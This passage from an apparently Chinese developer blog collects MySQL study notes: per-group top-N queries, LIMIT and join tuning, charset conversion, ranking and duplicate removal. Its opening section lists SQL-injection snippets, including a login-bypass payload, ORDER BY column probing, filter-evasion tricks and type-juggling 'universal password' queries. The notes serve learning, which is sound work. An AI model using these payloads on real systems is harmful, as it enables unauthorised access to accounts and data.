class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> user where username=<span class="string">''</span> and pass=<span class="string">''</span></span><br><span class="line"># 构造 username=devnull' or '1后，sql 语句变成</span><br><span class="line">select * <span class="keyword">from</span> user where username=<span class="string">'devnull'</span> or <span class="string">'1'</span> and pass=<span class="string">''</span></span><br><span class="line">SELECT * <span class="keyword">from</span> users t where t.username=a()</span><br><span class="line"><span class="comment">// 报错信息，数据库名是 test_db</span></span><br><span class="line">[Err] <span class="number">1305</span> - FUNCTION test_db.a does not exist</span><br><span class="line"># 原始的</span><br><span class="line">http:<span class="comment">//192.168.137.140/cms/show.php?id=35</span></span><br><span class="line"># 后面加上 order by 数字，就会按照第几个字段进行排序，如果没有会报错</span><br><span class="line">http:<span class="comment">//192.168.137.140/cms/show.php?id=35 order by 16</span></span><br><span class="line">mysql执行：语句正常；</span><br><span class="line"># mssql执行：语句错误，数据类型不匹配，无法正常执行</span><br><span class="line">select id,username <span class="keyword">from</span> users union select <span class="number">1</span>,<span class="number">2</span>;     </span><br><span class="line"></span><br><span class="line"># oracle执行：语句错误，数据类型不匹配</span><br><span class="line">select id,username <span class="keyword">from</span> users union select <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> dual;</span><br><span class="line"><span class="comment">// 使用括号，select, from , where 这些关键字不能用括号</span></span><br><span class="line">select(table_name)<span class="keyword">from</span>(information_schema.tables)where(table_schema)=database()</span><br><span class="line"><span class="comment">// 使用内联注释</span></span><br><span class="line">select<span class="comment">/*1*/</span>username<span class="comment">/*1*/</span><span class="keyword">from</span><span class="comment">/*1*/</span>users</span><br><span class="line"><span class="comment">// 使用%0a 绕过</span></span><br><span class="line"><span class="number">1</span> or <span class="number">1</span> == <span class="number">0x31206f722031</span></span><br><span class="line">不区分大小写</span><br><span class="line">select * <span class="keyword">from</span> table_name where a like <span class="string">'a%'</span></span><br><span class="line">select * <span class="keyword">from</span> table_name where a regexp <span class="string">'^a'</span></span><br><span class="line"></span><br><span class="line"># 区分大小写</span><br><span class="line">select * <span class="keyword">from</span> table_name where binary a like <span class="string">'a%'</span></span><br><span class="line">select * <span class="keyword">from</span> table_name where binary a regexp <span class="string">'^a'</span></span><br><span class="line">如果是数字开头的，则会变成前面的字符串 </span><br><span class="line"><span class="string">'123abc'</span> == <span class="number">123</span></span><br><span class="line"><span class="string">'abc'</span> == <span class="number">0</span></span><br><span class="line"># 可以把username不以数字开头的数据取出来</span><br><span class="line">select * <span class="keyword">from</span> users WHERE username=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">#  'abc' + 0 为 0</span><br><span class="line">select <span class="string">'abc'</span> + <span class="number">0</span>;</span><br><span class="line">#  'abc' + 123 为 123</span><br><span class="line">select <span class="string">'abc'</span> + <span class="number">123</span>;</span><br><span class="line"># 'abc' + '0' 为 0，做加法运算的时候，两边都变成数字 </span><br><span class="line">select <span class="string">'abc'</span> + <span class="string">'0'</span>;</span><br><span class="line">获取所有用户名和密码不为<span class="number">0</span>的数据，利用这种方式可以构造万能密码</span><br><span class="line"></span><br><span class="line"> et/<span class="number">2018</span>/<span class="number">10</span>/<span class="number">29</span>/ctf-sqli-notes/</span><br><span class="line">select * <span class="keyword">from</span> users where username=<span class="number">0</span> and password=<span class="number">0</span></span><br><span class="line">select * <span class="keyword">from</span> users where username=<span class="string">'abcd'</span> + <span class="string">'0'</span> and password=<span class="string">'abc'</span> + <span class="string">'0'</span></span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string">### limit 优化</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line">在偏移量非常大的时候，例如可能是LIMIT <span class="number">1000</span>,<span class="number">20</span>这样的查询，这时MySQL需要查询<span class="number">10020</span>条记录然后只返回最后<span class="number">20</span>条，前面<span class="number">1000</span>条记录都被抛弃，这样的代价非常高。如果所有的页面被访问的频率相同，那么这样的查询平均需要访问半个表的数据。要优化这种查询，要么是在页面中限制分页的数量，要么是优化大偏移量的性能。</span><br><span class="line"></span><br><span class="line">优化此类分页查询的一个最简单的办法就是尽可能地使用索引覆盖扫描，而不是查询所有的列。考虑下面的查询：</span><br><span class="line"></span><br><span class="line">select id,desc <span class="keyword">from</span> film order by title limit <span class="number">50000</span>,<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">select id,desc <span class="keyword">from</span> file inner join (select id <span class="keyword">from</span> file order by title limit <span class="number">50000</span>,<span class="number">10</span>) b on film.id=b.id;</span><br><span class="line">”延迟关联“将大大提升查询效率，它让MySQL扫描尽可能少的页面，获取需要访问的记录后再根据关联列回元表查询需要的所有列。这个技术也可以用于优化关联查询中的LIMIT子句。</span><br><span class="line"></span><br><span class="line">LIMIT和OFFSET的问题，其实是OFFSET的问题，它会导致MySQL扫描达赖给你不需要的行然后再抛弃掉。如果可以使用书签记录上次取数据的位置，那么下次就可以直接从该书签记录得位置开始扫描，这样就可以避免使用OFFSET。</span><br><span class="line"></span><br><span class="line">select id,desc <span class="keyword">from</span> film where id&gt;<span class="number">5000</span> limit <span class="number">10</span>;</span><br><span class="line">https:<span class="comment">//shuwoom.com/?p=2659</span></span><br></pre></td></tr></table></figure>
<h3 id="取出一组热门作者及他们最近发表的-3-篇文章"><a href="#取出一组热门作者及他们最近发表的-3-篇文章" class="headerlink" title="取出一组热门作者及他们最近发表的 3 篇文章"></a>取出一组热门作者及他们最近发表的 3 篇文章</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$users = \App\Models\User::limit(<span class="number">10</span>)-&gt;get();</span><br><span class="line"></span><br><span class="line">$users = $users-&gt;map(<span class="function"><span class="keyword">function</span> (<span class="params">$user</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//可以考虑$user-&gt;id缓存,在保证了速度的同时避免大面积的缓存重建</span></span><br><span class="line">    $user-&gt;posts = $user-&gt;posts()-&gt;limit(<span class="number">3</span>)-&gt;get();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $user;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $users;</span><br><span class="line">SELECT</span><br><span class="line">    posts.*,</span><br><span class="line">    @number := IF (@current_user_id = <span class="string">`user_id`</span>, @number + <span class="number">1</span>, <span class="number">1</span>) AS number,</span><br><span class="line">    @current_user_id := <span class="string">`user_id`</span></span><br><span class="line">FROM</span><br><span class="line">    (select * <span class="keyword">from</span> <span class="string">`posts`</span> where <span class="string">`posts`</span>.<span class="string">`user_id`</span> IN (<span class="number">572</span>, <span class="number">822</span>, <span class="number">911</span>, <span class="number">103</span>, <span class="number">234</span>, <span class="number">11</span>, <span class="number">999</span>, <span class="number">333</span>, <span class="number">121</span>, <span class="number">122</span>) order by <span class="string">`posts`</span>.<span class="string">`user_id`</span> ASC) AS posts</span><br><span class="line">HAVING</span><br><span class="line">    number &lt;= <span class="number">3</span></span><br><span class="line">简单解析一下这个 sql 语句.</span><br><span class="line">https:<span class="comment">//learnku.com/articles/24787#replies</span></span><br><span class="line">FORM 为一个子查询，初步筛选出我们需要的作者的所有文章，且正序排列后生成一个临时表.</span><br><span class="line"></span><br><span class="line">SELECT 为上面临时表添加标号，添加的方式如下. (你需要从上往下一行行一行的观察，与 select 的执行方式一致即可)</span><br><span class="line"></span><br><span class="line">MySQL 中调用未定义的变量，其值默认为 <span class="literal">null</span>.</span><br><span class="line">id	user_id	@current_user_id	<span class="keyword">if</span> 判断	@number</span><br><span class="line"><span class="number">1</span>	<span class="number">1</span>	<span class="literal">null</span>	<span class="literal">false</span>, number 被赋值为 <span class="number">1</span>	<span class="number">1</span></span><br><span class="line"><span class="number">2</span>	<span class="number">1</span>	<span class="number">1</span>	<span class="literal">true</span>, @number = @number + <span class="number">1</span>	<span class="number">2</span></span><br><span class="line"><span class="number">3</span>	<span class="number">1</span>	<span class="number">1</span>	<span class="literal">true</span>, @number = @number + <span class="number">1</span>	<span class="number">3</span></span><br><span class="line"><span class="number">4</span>	<span class="number">1</span>	<span class="number">1</span>	<span class="literal">true</span>, @number = @number + <span class="number">1</span>	<span class="number">4</span></span><br><span class="line"><span class="number">5</span>	<span class="number">2</span>	<span class="number">1</span>	<span class="literal">false</span>, number 被赋值为 <span class="number">1</span>	<span class="number">1</span></span><br><span class="line"><span class="number">6</span>	<span class="number">2</span>	<span class="number">2</span>	<span class="literal">true</span>, @number = @number + <span class="number">1</span>	<span class="number">2</span></span><br><span class="line">..	..	..	..	..</span><br><span class="line">HAVING 执行于 SELECT 之后，其再次筛选上面的临时表，只取 number &lt;= <span class="number">3</span> 的 行.</span><br><span class="line"></span><br><span class="line">select *, substring_index(group_concat(id order by id desc), <span class="string">','</span>, <span class="number">10</span>) <span class="keyword">from</span> orders</span><br><span class="line">group by sid;</span><br><span class="line"></span><br><span class="line">User::<span class="keyword">with</span>([<span class="string">'posts'</span>=&gt;<span class="function"><span class="keyword">function</span>(<span class="params">$query</span>)</span>&#123;</span><br><span class="line">            $query-&gt;whereRaw(<span class="string">'3 &gt; (select count(*) from posts as sub where sub.user_id = posts.user_id and sub.id &gt; posts.id ) '</span>)</span><br><span class="line">            -&gt;orderByDesc(<span class="string">'id'</span>);</span><br><span class="line">        &#125;])-&gt;get();</span><br></pre></td></tr></table></figure>
<h3 id="多更新"><a href="#多更新" class="headerlink" title="多更新"></a>多更新</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update your_table set is_default = (<span class="keyword">case</span> when id = <span class="number">3</span> then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end)</span><br></pre></td></tr></table></figure>
<h3 id="MySQL-调优经历"><a href="#MySQL-调优经历" class="headerlink" title="MySQL 调优经历"></a>MySQL 调优经历</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">create table <span class="string">`users`</span> (</span><br><span class="line">  <span class="string">`id`</span> int(<span class="number">10</span>) unsigned not <span class="literal">null</span> auto_increment,</span><br><span class="line">  <span class="string">`name`</span> varchar(<span class="number">255</span>) <span class="keyword">default</span> <span class="string">'name'</span>,</span><br><span class="line">  <span class="string">`a`</span> varchar(<span class="number">255</span>) <span class="keyword">default</span> <span class="string">'aaaaaaaaaaaaaaaa'</span>,</span><br><span class="line">  <span class="string">`b`</span> varchar(<span class="number">255</span>) <span class="keyword">default</span> <span class="string">'bbbbbbbbbbbbbbbb'</span>,</span><br><span class="line">  <span class="string">`c`</span> varchar(<span class="number">255</span>) <span class="keyword">default</span> <span class="string">'cccccccccccccccc'</span>,</span><br><span class="line">  primary key (<span class="string">`id`</span>)</span><br><span class="line">) engine=innodb;</span><br><span class="line">delimiter ;;</span><br><span class="line">  create procedure usersdata()</span><br><span class="line">  begin</span><br><span class="line">    declare i int;</span><br><span class="line">    set i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=<span class="number">4000</span>)<span class="keyword">do</span></span><br><span class="line">      insert into users(<span class="string">`name`</span>) values(<span class="string">'name'</span>);</span><br><span class="line">      set i=i+<span class="number">1</span>;</span><br><span class="line">    end <span class="keyword">while</span>;</span><br><span class="line">  end;;</span><br><span class="line">delimiter ;</span><br><span class="line">call usersdata();</span><br><span class="line">create table <span class="string">`user_enterprises`</span> (</span><br><span class="line">  <span class="string">`id`</span> int(<span class="number">11</span>) unsigned not <span class="literal">null</span> auto_increment,</span><br><span class="line">  <span class="string">`user_id`</span> int(<span class="number">11</span>) <span class="keyword">default</span> <span class="literal">null</span>,</span><br><span class="line">  primary key (<span class="string">`id`</span>)</span><br><span class="line">) engine=innodb;</span><br><span class="line">delimiter ;;</span><br><span class="line">  create procedure enterprisesdata()</span><br><span class="line">  begin</span><br><span class="line">    declare i int;</span><br><span class="line">    set i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=<span class="number">4000</span>)<span class="keyword">do</span></span><br><span class="line">      insert into user_enterprises(<span class="string">`user_id`</span>) values(i);</span><br><span class="line">      set i=i+<span class="number">1</span>;</span><br><span class="line">    end <span class="keyword">while</span>;</span><br><span class="line">  end;;</span><br><span class="line">delimiter ;</span><br><span class="line">call enterprisesdata();</span><br><span class="line">select * <span class="keyword">from</span> <span class="string">`users`</span> left join <span class="string">`user_enterprises`</span> on <span class="string">`users`</span>.<span class="string">`id`</span> = <span class="string">`user_enterprises`</span>.<span class="string">`user_id`</span> order by <span class="string">`users`</span>.<span class="string">`id`</span> desc;</span><br><span class="line">首先把 users 表的所有数据加入到 join buffer 中。</span><br><span class="line">扫描整个 user_enterprises 表的每一行数据，与 join buffer 中的 users 数据作对比，将满足条件的加入结果集。</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 打开 optimizer_trace，只对本线程有效 */</span></span><br><span class="line">SET optimizer_trace=<span class="string">'enabled=on'</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* @a 保存 Innodb_rows_read 的初始值 */</span></span><br><span class="line">select VARIABLE_VALUE into @a <span class="keyword">from</span>  performance_schema.session_status where variable_name = <span class="string">'Innodb_rows_read'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 执行语句 */</span></span><br><span class="line">select * <span class="keyword">from</span> <span class="string">`users`</span> left join <span class="string">`user_enterprises`</span> on <span class="string">`users`</span>.<span class="string">`id`</span> = <span class="string">`user_enterprises`</span>.<span class="string">`user_id`</span> order by <span class="string">`users`</span>.<span class="string">`id`</span> desc;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* @b 保存 Innodb_rows_read 的当前值 */</span></span><br><span class="line">select VARIABLE_VALUE into @b <span class="keyword">from</span> performance_schema.session_status where variable_name = <span class="string">'Innodb_rows_read'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 计算 Innodb_rows_read 差值 */</span></span><br><span class="line">select @b-@a;</span><br><span class="line">我们得到的扫描行数是 <span class="number">12000</span>。在执行 join 的时候，扫描行数应该是 <span class="number">4000</span> + <span class="number">4000</span>，还有 <span class="number">4000</span> 的扫描行数我推测应该是回表取了数据。</span><br><span class="line"></span><br><span class="line">启用 optimizer_trace 调试：</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 打开 optimizer_trace，只对本线程有效 */</span></span><br><span class="line">set optimizer_trace=<span class="string">'enabled=on'</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* 执行语句 */</span></span><br><span class="line">select * <span class="keyword">from</span> <span class="string">`users`</span> left join <span class="string">`user_enterprises`</span> on <span class="string">`users`</span>.<span class="string">`id`</span> = <span class="string">`user_enterprises`</span>.<span class="string">`user_id`</span> order by <span class="string">`users`</span>.<span class="string">`id`</span> desc;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 查看 OPTIMIZER_TRACE 输出 */</span></span><br><span class="line">select * <span class="keyword">from</span> <span class="string">`information_schema`</span>.<span class="string">`optimizer_trace`</span>;</span><br><span class="line">我们看到使用的排序方法是 rowid 排序，select @@max_length_for_sort_data 的结果为 <span class="number">1024</span>，即参与排序的字段大于了这个值，mysql 会把排序字段和主键取出来放入 sort buffer，完成排序后回表取数据。在这儿还用到了临时表。所以大致执行过程应该是 join 之后把数据存在了临时表，然后使用 rowid 排序。</span><br><span class="line"></span><br><span class="line">从上面我们发现这个过程是复杂的，如果在 user_enterprises 表上给 user_id 加上索引。</span><br><span class="line"></span><br><span class="line">alter table <span class="string">`user_enterprises`</span> add key <span class="string">`user_id_index`</span> (<span class="string">`user_id`</span>);</span><br><span class="line"></span><br><span class="line">首先 join 的执行流程发生了变化，大体流程是：</span><br><span class="line"></span><br><span class="line">在 users 表里取出一行数据</span><br><span class="line">根据索引在 user_enterprises 表里获取结果，组成结果集</span><br><span class="line">我们发现使用到了索引后，就没有在 join buffer 里那些复杂操作了。因为索引的有序性，排序也免了，整个查询过程所需要的时间也大大减少。https:<span class="comment">//learnku.com/articles/28964</span></span><br></pre></td></tr></table></figure>
<h3 id="exists"><a href="#exists" class="headerlink" title="exists"></a>exists</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/29168</span></span><br><span class="line">SELECT </span><br><span class="line">sql_no_cache <span class="string">`product_id`</span></span><br><span class="line">FROM</span><br><span class="line"><span class="string">`zx_tests`</span> AS a</span><br><span class="line">WHERE</span><br><span class="line"><span class="string">`pn_id`</span> = <span class="number">101</span> AND <span class="string">`pv_id`</span> = <span class="number">59</span></span><br><span class="line">    AND EXISTS( SELECT </span><br><span class="line">       sql_no_cache  *</span><br><span class="line">    FROM</span><br><span class="line">        <span class="string">`zx_tests`</span></span><br><span class="line">    WHERE</span><br><span class="line">    a.product_id = product_id and</span><br><span class="line">        <span class="string">`pn_id`</span> = <span class="number">101</span> AND <span class="string">`pv_id`</span> = <span class="number">171</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">2</span> 组条件下 <span class="number">0.657</span>，<span class="number">3</span> 组 <span class="number">0.695</span>，<span class="number">4</span> 组 <span class="number">0.759</span>，<span class="number">5</span> 组 <span class="number">0.743</span></span><br><span class="line">SELECT <span class="string">`product_id`</span> FROM <span class="string">`product`</span> WHERE <span class="string">`pn_id`</span> = <span class="number">5</span> AND <span class="string">`pv_id`</span> = <span class="number">135</span> AND <span class="string">`product_id`</span> IN (SELECT <span class="string">`product_id`</span> FROM <span class="string">`product`</span> WHERE <span class="string">`pn_id`</span> = <span class="number">11</span> AND <span class="string">`pv_id`</span> = <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line">    <span class="number">2</span> 组条件下 <span class="number">0.729</span>，<span class="number">3</span> 组 <span class="number">0.75</span>，<span class="number">4</span> 组 <span class="number">0.730</span>，<span class="number">5</span> 组 <span class="number">0.757</span></span><br></pre></td></tr></table></figure>
<h3 id="批量更新所有字段字符集"><a href="#批量更新所有字段字符集" class="headerlink" title="批量更新所有字段字符集"></a>批量更新所有字段字符集</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">    declare f_name varchar(<span class="number">100</span>); </span><br><span class="line">    declare b int <span class="keyword">default</span> <span class="number">0</span>;    <span class="comment">/*是否达到记录的末尾控制变量*/</span></span><br><span class="line">		-- 注意修改下面的数据库名称 wsm_aliyun</span><br><span class="line">    declare table_name cursor <span class="keyword">for</span> SELECT TABLE_NAME FROM information_schema.TABLES where TABLE_SCHEMA = <span class="string">'construction_online'</span>;</span><br><span class="line">    DECLARE CONTINUE HANDLER FOR NOT FOUND SET b = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    OPEN table_name;</span><br><span class="line">    REPEAT</span><br><span class="line">    FETCH table_name INTO f_name; <span class="comment">/*获取第一条记录*/</span></span><br><span class="line">				SET @STMT :=CONCAT(<span class="string">"ALTER TABLE "</span>,f_name,<span class="string">" CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;"</span>);   </span><br><span class="line">			PREPARE STMT FROM @STMT;   </span><br><span class="line">    EXECUTE STMT;  </span><br><span class="line">-- INSERT into TestTable(name) VALUES (f_name);</span><br><span class="line">       -- ALTER TABLE f_name CONVERT TO CHARACTER SET utf8 COLLATE utf8_general_ci; </span><br><span class="line">    UNTIL b = <span class="number">1</span></span><br><span class="line">		END REPEAT;</span><br><span class="line">    close table_name;</span><br><span class="line">end</span><br><span class="line">https:<span class="comment">//wi1dcard.cn/posts/mysql-update-all-collations/</span></span><br></pre></td></tr></table></figure>
<h3 id="每门科目成绩前三的数据"><a href="#每门科目成绩前三的数据" class="headerlink" title="每门科目成绩前三的数据"></a>每门科目成绩前三的数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">表：student_score，姓名：name，科目：subject，分数 score</span><br><span class="line">SELECT</span><br><span class="line">    a.*</span><br><span class="line">FROM</span><br><span class="line">    student AS a</span><br><span class="line">LEFT JOIN student AS b ON a.<span class="string">`subject`</span> = b.<span class="string">`subject`</span></span><br><span class="line">AND a.score &lt; b.score</span><br><span class="line">GROUP BY</span><br><span class="line">    a.id,</span><br><span class="line">    a. SUBJECT,</span><br><span class="line">    a.score</span><br><span class="line">HAVING</span><br><span class="line">    COUNT(b.id) &lt; <span class="number">3</span></span><br><span class="line">ORDER BY</span><br><span class="line">    a.<span class="string">`subject`</span>,</span><br><span class="line">    a.score DESC</span><br></pre></td></tr></table></figure>
<h3 id="删除表中重复数据，并保留一条"><a href="#删除表中重复数据，并保留一条" class="headerlink" title="删除表中重复数据，并保留一条"></a>删除表中重复数据，并保留一条</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM student WHERE</span><br><span class="line">(<span class="string">`name`</span>,<span class="string">`subject`</span>,score) IN (</span><br><span class="line">    SELECT t.name,t.subject,t.score FROM (</span><br><span class="line">        SELECT <span class="string">`name`</span>,<span class="string">`subject`</span>,score FROM student </span><br><span class="line">        GROUP BY <span class="string">`name`</span>,<span class="string">`subject`</span>,score </span><br><span class="line">        HAVING COUNT(<span class="number">1</span>)&gt;<span class="number">1</span></span><br><span class="line">    )t</span><br><span class="line">)</span><br><span class="line">AND id not <span class="keyword">in</span>(</span><br><span class="line">  SELECT a.minId FROM (</span><br><span class="line">        SELECT id <span class="keyword">as</span> minId FROM student </span><br><span class="line">        GROUP BY <span class="string">`name`</span>,<span class="string">`subject`</span>,score </span><br><span class="line">        HAVING COUNT(<span class="number">1</span>)&gt;<span class="number">1</span></span><br><span class="line">    )a</span><br><span class="line">)</span><br><span class="line">所有科目成绩都大于 <span class="number">80</span> 分的学生数据</span><br><span class="line"></span><br><span class="line">select name <span class="keyword">from</span> student group by name having min(score)&gt;<span class="number">80</span>;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29467</span></span><br></pre></td></tr></table></figure>
<h3 id="并列排名和顺序排名查询"><a href="#并列排名和顺序排名查询" class="headerlink" title="并列排名和顺序排名查询"></a>并列排名和顺序排名查询</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">获取分数排名，要求并列排名。如果两个分数相同，则两个分数排名（rank）相同。名次之间不应该有“间隔”。</span><br><span class="line">id	score</span><br><span class="line"><span class="number">1</span>	<span class="number">99</span></span><br><span class="line"><span class="number">2</span>	<span class="number">80</span></span><br><span class="line"><span class="number">3</span>	<span class="number">87</span></span><br><span class="line"><span class="number">4</span>	<span class="number">60</span></span><br><span class="line"><span class="number">5</span>	<span class="number">80</span></span><br><span class="line"><span class="number">6</span>	<span class="number">99</span></span><br><span class="line">select id, score, (select count(distinct(score)) <span class="keyword">from</span> scores <span class="keyword">as</span> b where b.score &gt; a.score ) + <span class="number">1</span> <span class="keyword">as</span> rank <span class="keyword">from</span> scores <span class="keyword">as</span> a order by rank;</span><br><span class="line"></span><br><span class="line">select id, score, (select count(distinct(score)) <span class="keyword">from</span> scores <span class="keyword">as</span> b where b.score &gt; a.score ) + <span class="number">1</span> <span class="keyword">as</span> rank <span class="keyword">from</span> scores <span class="keyword">as</span> a order by rank;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/27599</span></span><br><span class="line">select t.id, 